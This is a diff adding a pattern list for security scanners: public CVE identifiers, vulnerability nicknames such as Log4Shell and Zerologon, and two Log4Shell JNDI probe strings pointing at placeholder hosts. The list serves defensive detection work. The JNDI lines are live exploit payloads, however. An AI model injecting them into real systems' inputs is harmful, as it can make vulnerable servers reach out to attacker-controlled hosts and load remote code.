@@ -1,0 +1,29 @@
+# Well-known CVE identifiers and vulnerability nicknames that scanners,
+# YARA rules and report parsers match on. Identifiers are public facts.
+
+CVE-2021-44228
+CVE-2017-0144
+CVE-2014-0160
+CVE-2019-0708
+CVE-2020-1472
+CVE-2022-30190
+CVE-2023-34362
+CVE-2021-34527
+CVE-2021-36942
+CVE-2023-23397
+
+# Nicknames
+Log4Shell
+EternalBlue
+Heartbleed
+BlueKeep
+Zerologon
+Follina
+PrintNightmare
+PetitPotam
+MOVEit
+
+# Bulletin and probe formats that accompany the IDs
+MS17-010
+${jndi:ldap://example.com/a}
+${jndi:dns://example.invalid/x}
